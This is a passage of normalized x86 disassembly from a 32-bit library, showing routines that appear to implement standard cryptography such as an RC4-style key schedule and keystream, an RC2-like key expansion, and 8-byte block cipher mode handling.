mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
inc eax
shr ecx 0x18
mov [ eax ] cl
mov ecx [ esp + 0x4 ]
inc eax
mov edx ecx
shr edx 0x8
mov [ eax ] cl
inc eax
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
shr ecx 0x18
mov [ eax ] dl
mov [ eax + 0x1 ] cl
add esp 0x8
retn
sub_10043350
mov eax 0x18
call sub_1001d0d0
mov eax [ esp + 0x30 ]
push ebx
push ebp
mov ebp [ esp + 0x34 ]
push esi
push edi
mov edi [ eax ]
lea esi [ ebp + 0x1 ]
xor eax eax
xor ecx ecx
mov al [ ebp ]
mov ch [ esi ]
mov [ esp + 0x14 ] esi
or eax ecx
inc esi
xor edx edx
xor ecx ecx
mov [ esp + 0x10 ] 0x0
mov dl [ esi ]
mov cl [ esi + 0x1 ]
shl edx 0x10
or eax edx
inc esi
shl ecx 0x18
or eax ecx
inc esi
xor ecx ecx
xor edx edx
mov cl [ esi ]
mov dh [ esi + 0x1 ]
inc esi
or ecx edx
inc esi
xor edx edx
mov ebx eax
mov [ esp + 0x18 ] al
mov dh [ esi + 0x1 ]
mov dl [ esi ]
shl edx 0x10
shr ebx 0x8
or ecx edx
mov [ esp + 0x19 ] bl
mov edx eax
mov ebx eax
shr eax 0x18
mov [ esp + 0x1b ] al
mov eax ecx
shr eax 0x8
mov [ esp + 0x1d ] al
mov eax ecx
shr eax 0x10
mov [ esp + 0x1e ] al
mov eax [ esp + 0x34 ]
mov [ esp + 0x24 ] ecx
mov [ esp + 0x1c ] cl
shr ebx 0x10
shr ecx 0x18
test eax eax
mov [ esp + 0x20 ] edx
mov [ esp + 0x1a ] bl
mov [ esp + 0x1f ] cl
je r-xdata
mov edx [ esp + 0x40 ]
mov [ edx ] edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov esi [ esp + 0x30 ]
mov ebx [ esp + 0x2c ]
mov ecx [ esp + 0x24 ]
mov [ esp + 0x3c ] eax
mov al [ esp + edi + 0x18 ]
xor al [ ebx ]
inc esi
inc ebx
inc edi
mov [ esi - 0x1 ] al
mov eax [ esp + 0x3c ]
and edi 0x7
dec eax
mov [ esp + 0x3c ] eax
jne r-xdata
mov ecx [ esp + 0x38 ]
lea edx [ esp + 0x20 ]
push ecx
push edx
call sub_10042dc0
mov edx [ esp + 0x28 ]
add esp 0x8
mov eax edx
mov ecx edx
shr eax 0x8
mov [ esp + 0x19 ] al
mov eax edx
shr ecx 0x10
mov [ esp + 0x1a ] cl
mov ecx [ esp + 0x24 ]
shr eax 0x18
mov [ esp + 0x1b ] al
mov eax ecx
shr eax 0x8
mov [ esp + 0x1d ] al
mov eax ecx
shr eax 0x10
mov [ esp + 0x1e ] al
mov eax ecx
shr eax 0x18
mov [ esp + 0x1f ] al
mov eax [ esp + 0x10 ]
inc eax
mov [ esp + 0x18 ] dl
mov [ esp + 0x1c ] cl
mov [ esp + 0x10 ] eax
test edi edi
jne r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
mov [ ecx ] edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov eax [ esp + 0x14 ]
mov ebx edx
shr ebx 0x8
mov [ ebp ] dl
mov [ eax ] bl
mov ebx edx
inc eax
shr ebx 0x10
mov [ eax ] bl
inc eax
shr edx 0x18
mov [ eax ] dl
inc eax
mov edx ecx
mov [ eax ] cl
inc eax
shr edx 0x8
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
shr ecx 0x18
mov [ eax ] dl
mov [ eax + 0x1 ] cl
mov eax [ esp + 0x40 ]
mov [ eax ] edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
sub_10043500
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
cmp esi 0x80
mov [ eax ] 0x0
jle r-xdata
mov ecx [ esp + 0x20 ]
test ecx ecx
jle r-xdata
mov esi 0x80
mov ecx 0x400
cmp ecx 0x400
jle r-xdata
xor edx edx
cmp esi 0x80
mov dl [ eax + esi - 0x1 ]
jge r-xdata
mov edi [ esp + 0x1c ]
mov edx eax
sub edi eax
mov ebp esi
test esi esi
jle r-xdata
lea esi [ ecx + 0x7 ]
mov edx 0x80
neg ecx
sar esi 0x3
and ecx 0x7
mov edi 0xff
sub edx esi
sar edi cl
xor ecx ecx
mov cl [ edx + eax ]
and edi ecx
xor ecx ecx
mov cl [ edi + rw-data ]
mov edi edx
mov [ edx + eax ] cl
dec edx
test edi edi
je r-xdata
mov edi eax
sub edi esi
mov bl [ edi + edx ]
mov [ edx ] bl
inc edx
dec ebp
jne r-xdata
lea esi [ eax + 0xfc ]
mov ecx 0x7f
lea edi [ edx + eax ]
lea ebp [ edx + 0x1 ]
mov bl [ edi + esi ]
add ebx edx
xor edx edx
and ebx 0xff
inc esi
cmp esi 0x80
mov dl [ ebx + rw-data ]
mov [ esi + eax - 0x1 ] dl
jl r-xdata
xor edx edx
xor ebx ebx
mov dl [ ecx + eax - 0x1 ]
mov bh [ ecx + eax ]
and edx 0xffff
sub esi 0x4
or edx ebx
sub ecx 0x2
mov [ esi + 0x4 ] edx
jns r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
xor edx edx
mov dl [ edi + esi ]
xor edx ecx
xor ecx ecx
dec ebp
dec edi
mov cl [ edx + rw-data ]
mov [ edi + 0x1 ] cl
test ebp ebp
ja r-xdata
sub_10043600
push esi
push 0x4
call sub_1002edc0
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
push esi
call sub_1002ec90
add esp 0xc
test eax eax
jne r-xdata
pop esi
retn
mov edx [ esp + 0x8 ]
push esi
push 0x4
push edx
call sub_1004d940
add esp 0xc
mov eax 0x1
pop esi
retn
pop esi
retn
sub_10043650
mov eax [ esp + 0x4 ]
cmp [ eax ] 0x4
jne r-xdata
push 0x53
push r--data
push 0x6d
push 0x87
push 0xd
call sub_1001de60
add esp 0x14
or eax 0xffffffff
retn
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
push esi
mov esi [ eax + 0x8 ]
mov eax [ eax ]
cmp eax ecx
push edi
jge r-xdata
mov edi [ esp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
mov ecx eax
sub_100436b0
mov eax 0x40
call sub_1001d0d0
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x50 ]
lea eax [ esp + 0x20 ]
push ebx
mov [ esp + 0xc ] eax
mov eax [ esp + 0x4c ]
push esi
mov [ esp + 0x20 ] ecx
push edi
lea ecx [ esp + 0xc ]
push eax
push ecx
mov [ esp + 0x14 ] 0x20
mov [ esp + 0x28 ] 0x4
mov [ esp + 0x24 ] edx
call sub_1002f410
lea edx [ esp + 0x14 ]
push 0x0
push edx
call sub_1002eeb0
mov edi eax
push 0x0
push 0x4
lea eax [ esp + 0x34 ]
push 0x0
push eax
call sub_10058cb0
add edi eax
push 0x10
push edi
push 0x1
call sub_1002eb00
add esp 0x2c
mov ebx eax
call sub_1002ed60
mov esi eax
test esi esi
jne r-xdata
push ebx
push 0x0
push esi
call sub_1002ec90
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x40
retn
mov ecx [ esi + 0x8 ]
push 0x0
push 0x10
push edi
lea edx [ esp + 0x64 ]
push 0x1
mov [ esi ] ebx
push edx
mov [ esp + 0x6c ] ecx
call sub_1002ea00
lea eax [ esp + 0x6c ]
lea ecx [ esp + 0x20 ]
push eax
push ecx
call sub_1002eeb0
push 0x0
lea edx [ esp + 0x78 ]
push 0x4
lea eax [ esp + 0x40 ]
push edx
push eax
call sub_10058cb0
mov ecx [ esp + 0x7c ]
push esi
push 0x10
push ecx
call sub_1004d940
add esp 0x38
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x40
retn
push esi
call sub_1002ee10
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x40
retn
sub_100437b0
mov eax 0x34
call sub_1001d0d0
mov eax [ esp + 0x38 ]
push ebx
push ebp
or ebp 0xffffffff
mov ecx [ eax ]
xor ebx ebx
push esi
cmp ecx 0x10
push edi
mov [ esp + 0x10 ] 0x0
jne r-xdata
push 0xb7
push r--data
push 0x6d
push 0x86
push 0xd
call sub_1001de60
add esp 0x14
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebx
call sub_1002ee10
add esp 0x4
mov ecx [ eax + 0x8 ]
lea edx [ esp + 0x48 ]
mov [ esp + 0x48 ] ecx
mov eax [ eax ]
mov [ esp + 0x14 ] eax
add eax ecx
mov [ esp + 0x34 ] eax
mov [ esp + 0x18 ] ecx
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
mov [ esp + 0x44 ] edx
mov [ esp + 0x28 ] 0x6d
call sub_1002eb40
add esp 0x8
test eax eax
jne r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x34
retn
push eax
call sub_1002ee10
add esp 0x4
mov eax [ esp + 0x30 ]
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
push 0x0
mov [ esp + 0x44 ] edx
call sub_1002ee90
add esp 0xc
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
mov [ esp + 0x40 ] 0xa0
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x30 ]
sub edx eax
add ecx edx
mov [ esp + 0x38 ] eax
lea eax [ esp + 0x18 ]
push ecx
push eax
push 0x0
mov [ esp + 0x3c ] ecx
call sub_1002ef60
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
mov ecx [ esp + 0x38 ]
mov esi [ esp + 0x18 ]
mov eax [ esp + 0x30 ]
sub ecx esi
add eax ecx
mov cl [ esp + 0x24 ]
test cl 0x1
mov [ esp + 0x30 ] eax
jne r-xdata
push eax
lea eax [ esp + 0x1c ]
push eax
call sub_1002e840
add esp 0x8
mov [ esp + 0x1c ] eax
xor edx edx
test eax eax
setle dl
mov eax edx
jmp r-xdata
mov esi [ esp + 0x4c ]
test esi esi
je r-xdata
test eax eax
je r-xdata
mov ebp [ ebx ]
mov ecx [ esp + 0x54 ]
cmp ecx ebp
jle r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call sub_1002f4d0
add esp 0x4
mov [ esi ] eax
mov edi [ esp + 0x50 ]
test edi edi
je r-xdata
mov ecx ebp
test ebx ebx
je r-xdata
mov esi [ ebx + 0x8 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
sub_10043950
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
xor ecx ecx
push edi
lea esi [ eax + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
xor edi edi
xor eax eax
mov edx esi
mov [ edx ] ecx
inc ecx
add edx 0x4
cmp ecx 0x100
jb r-xdata
mov ebp [ esp + 0x20 ]
lea ecx [ esi + 0x8 ]
mov [ esp + 0x10 ] 0x40
mov edx [ esi + edi * 4 ]
mov [ ecx - 0x8 ] edx
mov edx [ esp + 0x18 ]
mov [ esi + edi * 4 ] edx
mov edx [ ecx - 0x4 ]
mov bl [ eax + ebp ]
add ebx edx
add ebx edi
and ebx 0xff
inc eax
mov edi ebx
mov ebx [ esp + 0x1c ]
cmp eax ebx
jne r-xdata
xor eax eax
mov ebx [ esi + edi * 4 ]
mov [ ecx - 0x4 ] ebx
mov [ esi + edi * 4 ] edx
mov edx [ ecx ]
mov bl [ eax + ebp ]
add ebx edx
add ebx edi
and ebx 0xff
inc eax
mov edi ebx
mov ebx [ esp + 0x1c ]
cmp eax ebx
jne r-xdata
xor eax eax
mov ebx [ esi + edi * 4 ]
mov [ ecx ] ebx
mov [ esi + edi * 4 ] edx
mov edx [ ecx + 0x4 ]
mov bl [ eax + ebp ]
add ebx edx
add ebx edi
and ebx 0xff
inc eax
mov edi ebx
mov ebx [ esp + 0x1c ]
cmp eax ebx
jne r-xdata
xor eax eax
mov ebx [ esi + edi * 4 ]
mov [ ecx + 0x4 ] ebx
mov [ esi + edi * 4 ] edx
mov edx [ esp + 0x10 ]
add ecx 0x10
dec edx
mov [ esp + 0x10 ] edx
jne r-xdata
xor eax eax
mov edx [ ecx - 0x8 ]
mov [ esp + 0x18 ] edx
mov dl [ eax + ebp ]
add edx [ esp + 0x18 ]
add edx edi
and edx 0xff
inc eax
mov edi edx
mov edx [ esp + 0x1c ]
cmp eax edx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_10043a50
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push ebx
mov ecx edx
push ebp
mov ebp [ eax + 0x4 ]
push esi
push edi
mov edi [ eax ]
shr ecx 0x3
mov [ esp + 0x14 ] ecx
je r-xdata
mov ecx [ esp + 0x20 ]
mov esi [ esp + 0x1c ]
jmp r-xdata
inc edi
mov esi [ esp + 0x1c ]
and edi 0xff
mov ecx [ eax + edi * 4 + 0x8 ]
add ebp ecx
and ebp 0xff
mov edx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] edx
add edx ecx
and edx 0xff
mov [ eax + ebp * 4 + 0x8 ] ecx
mov bl [ esi ]
mov ecx [ esp + 0x20 ]
mov dl [ eax + edx * 4 + 0x8 ]
xor dl bl
inc edi
and edi 0xff
mov [ ecx ] dl
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi + 0x1 ]
xor dl bl
inc edi
and edi 0xff
mov [ ecx + 0x1 ] dl
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi + 0x2 ]
xor dl bl
inc edi
and edi 0xff
mov [ ecx + 0x2 ] dl
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi + 0x3 ]
xor dl bl
inc edi
and edi 0xff
mov [ ecx + 0x3 ] dl
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi + 0x4 ]
xor dl bl
inc edi
and edi 0xff
mov [ ecx + 0x4 ] dl
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
mov [ eax + ebp * 4 + 0x8 ] edx
add ebx edx
and ebx 0xff
add esi 0x8
add ecx 0x8
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi - 0x3 ]
xor dl bl
inc edi
and edi 0xff
mov [ ecx - 0x3 ] dl
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi - 0x2 ]
xor dl bl
inc edi
and edi 0xff
mov [ ecx - 0x2 ] dl
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi - 0x1 ]
xor dl bl
mov [ ecx - 0x1 ] dl
mov edx [ esp + 0x14 ]
dec edx
je r-xdata
and edx 0x7
mov [ esp + 0x14 ] edx
je r-xdata
mov edx [ esp + 0x18 ]
mov [ esp + 0x20 ] edx
mov [ eax ] edi
pop edi
mov [ eax + 0x4 ] ebp
pop esi
pop ebp
pop ebx
retn
inc edi
and edi 0xff
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi ]
xor dl bl
mov [ ecx ] dl
mov edx [ esp + 0x14 ]
dec edx
mov [ esp + 0x14 ] edx
je r-xdata
inc edi
and edi 0xff
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi ]
xor dl bl
inc edi
and edi 0xff
mov [ ecx ] dl
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi + 0x1 ]
xor dl bl
inc edi
and edi 0xff
mov [ ecx + 0x1 ] dl
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi + 0x2 ]
xor dl bl
inc edi
and edi 0xff
mov [ ecx + 0x2 ] dl
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi + 0x3 ]
xor dl bl
inc edi
and edi 0xff
mov [ ecx + 0x3 ] dl
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi + 0x4 ]
xor dl bl
inc edi
and edi 0xff
mov [ ecx + 0x4 ] dl
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi + 0x5 ]
add esi 0x8
xor dl bl
inc edi
and edi 0xff
mov [ ecx + 0x5 ] dl
add ecx 0x8
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi - 0x2 ]
xor dl bl
inc edi
and edi 0xff
mov [ ecx - 0x2 ] dl
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi - 0x1 ]
xor dl bl
mov [ ecx - 0x1 ] dl
mov edx [ esp + 0x20 ]
dec edx
mov [ esp + 0x20 ] edx
jne r-xdata
inc edi
and edi 0xff
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi + 0x1 ]
xor dl bl
mov [ ecx + 0x1 ] dl
mov edx [ esp + 0x14 ]
dec edx
mov [ esp + 0x14 ] edx
je r-xdata
inc edi
and edi 0xff
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi + 0x2 ]
xor dl bl
mov [ ecx + 0x2 ] dl
mov edx [ esp + 0x14 ]
dec edx
mov [ esp + 0x14 ] edx
je r-xdata
inc edi
and edi 0xff
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi + 0x3 ]
xor dl bl
mov [ ecx + 0x3 ] dl
mov edx [ esp + 0x14 ]
dec edx
mov [ esp + 0x14 ] edx
je r-xdata
inc edi
and edi 0xff
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi + 0x4 ]
xor dl bl
mov [ ecx + 0x4 ] dl
mov edx [ esp + 0x14 ]
dec edx
mov [ esp + 0x14 ] edx
je r-xdata
inc edi
and edi 0xff
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi + 0x5 ]
xor dl bl
mov [ ecx + 0x5 ] dl
mov edx [ esp + 0x14 ]
dec edx
mov [ esp + 0x14 ] edx
je r-xdata
inc edi
and edi 0xff
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi + 0x6 ]
xor dl bl
mov [ ecx + 0x6 ] dl
mov edx [ esp + 0x14 ]
dec edx
mov [ esp + 0x14 ] edx
je r-xdata
inc edi
and edi 0xff
mov edx [ eax + edi * 4 + 0x8 ]
add ebp edx
and ebp 0xff
mov ebx [ eax + ebp * 4 + 0x8 ]
mov [ eax + edi * 4 + 0x8 ] ebx
add ebx edx
and ebx 0xff
mov [ eax + ebp * 4 + 0x8 ] edx
mov dl [ eax + ebx * 4 + 0x8 ]
mov bl [ esi ]
xor dl bl
mov [ ecx ] dl
mov edx [ esp + 0x14 ]
dec edx
mov [ esp + 0x14 ] edx
jne r-xdata
sub_10044000
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0xc ]
xor ecx ecx
xor edx edx
mov cl [ eax ]
mov dl [ eax + 0x1 ]
shl ecx 0x18
inc eax
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
or ecx edx
inc eax
mov [ esp ] ecx
xor ecx ecx
mov cl [ eax ]
xor edx edx
mov dl [ eax + 0x1 ]
shl ecx 0x18
inc eax
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
mov dl [ eax + 0x1 ]
mov eax [ esp + 0x14 ]
or edx ecx
lea ecx [ esp ]
push eax
push ecx
mov [ esp + 0xc ] edx
call sub_100445f0
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x18 ]
mov edx ecx
shr edx 0x18
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x8
mov [ eax ] dl
inc eax
mov [ eax ] cl
mov ecx [ esp + 0xc ]
mov edx ecx
inc eax
shr edx 0x18
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x8
mov [ eax ] dl
mov [ eax + 0x1 ] cl
add esp 0x10
retn
sub_100440b0
mov eax 0x10
call sub_1001d0d0
mov eax [ esp + 0x28 ]
push ebx
push ebp
push esi
test eax eax
push edi
je r-xdata
mov ebp [ esp + 0x34 ]
xor eax eax
xor ecx ecx
xor edx edx
mov al [ ebp ]
mov cl [ ebp + 0x1 ]
shl eax 0x18
inc ebp
shl ecx 0x10
mov dh [ ebp + 0x1 ]
or eax ecx
inc ebp
or eax edx
inc ebp
xor ecx ecx
xor edx edx
mov cl [ ebp ]
or eax ecx
inc ebp
xor ecx ecx
mov [ esp + 0x10 ] eax
mov cl [ ebp ]
mov dl [ ebp + 0x1 ]
shl ecx 0x18
inc ebp
shl edx 0x10
or ecx edx
inc ebp
xor edx edx
mov dh [ ebp ]
or ecx edx
inc ebp
xor edx edx
mov dl [ ebp ]
sub ebp 0x7
or ecx edx
mov edx [ esp + 0x2c ]
add edx 0xfffffff8
mov [ esp + 0x38 ] ecx
test edx edx
mov [ esp + 0x34 ] ebp
mov [ esp + 0x2c ] edx
jl r-xdata
mov ebp [ esp + 0x34 ]
xor edx edx
xor eax eax
xor ecx ecx
mov dl [ ebp ]
mov al [ ebp + 0x1 ]
shl edx 0x18
inc ebp
shl eax 0x10
mov ch [ ebp + 0x1 ]
or edx eax
inc ebp
or edx ecx
inc ebp
xor eax eax
xor ecx ecx
mov al [ ebp ]
or edx eax
inc ebp
xor eax eax
mov al [ ebp ]
mov cl [ ebp + 0x1 ]
shl eax 0x18
inc ebp
shl ecx 0x10
or eax ecx
inc ebp
xor ecx ecx
mov ch [ ebp ]
or eax ecx
inc ebp
xor ecx ecx
mov cl [ ebp ]
sub ebp 0x7
or eax ecx
mov ecx [ esp + 0x2c ]
mov [ esp + 0x34 ] eax
lea ebx [ ecx - 0x8 ]
test ebx ebx
jl r-xdata
mov edi [ esp + 0x28 ]
mov esi [ esp + 0x24 ]
jmp r-xdata
lea eax [ edx + 0x8 ]
mov edi [ esp + 0x28 ]
shr eax 0x3
mov esi [ esp + 0x24 ]
mov [ esp + 0x14 ] eax
neg eax
lea eax [ edx + eax * 8 ]
mov [ esp + 0x2c ] eax
mov esi [ esp + 0x28 ]
mov edi [ esp + 0x24 ]
jmp r-xdata
lea eax [ ebx + 0x8 ]
mov esi [ esp + 0x28 ]
shr eax 0x3
mov edi [ esp + 0x24 ]
mov [ esp + 0x38 ] eax
neg eax
lea eax [ ebx + eax * 8 ]
mov [ esp + 0x2c ] eax
cmp edx 0xfffffff8
je r-xdata
xor ecx ecx
xor edx edx
mov cl [ esi ]
mov dl [ esi + 0x1 ]
mov ebp ecx
xor eax eax
shl ebp 0x18
inc esi
xor ecx ecx
shl edx 0x10
mov ah [ esi + 0x1 ]
or ebp edx
inc esi
or ebp eax
inc esi
xor ebx ebx
xor edx edx
xor eax eax
mov cl [ esi ]
mov bl [ esi + 0x1 ]
or ebp ecx
inc esi
shl ebx 0x18
mov dl [ esi + 0x1 ]
inc esi
shl edx 0x10
mov ah [ esi + 0x1 ]
or ebx edx
inc esi
mov edx [ esp + 0x30 ]
or ebx eax
inc esi
xor ecx ecx
lea eax [ esp + 0x18 ]
mov cl [ esi ]
push edx
or ebx ecx
push eax
mov [ esp + 0x20 ] ebp
inc esi
mov [ esp + 0x24 ] ebx
call sub_100445f0
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
xor eax ecx
mov ecx [ esp + 0x40 ]
add esp 0x8
xor ecx edx
mov edx eax
shr edx 0x18
mov [ edi ] dl
mov edx eax
inc edi
mov [ esp + 0x10 ] ebp
shr edx 0x10
mov [ edi ] dl
mov edx eax
inc edi
mov [ esp + 0x38 ] ebx
shr edx 0x8
mov [ edi ] dl
inc edi
mov edx ecx
mov [ edi ] al
mov eax ecx
inc edi
shr eax 0x18
mov [ edi ] al
inc edi
shr edx 0x10
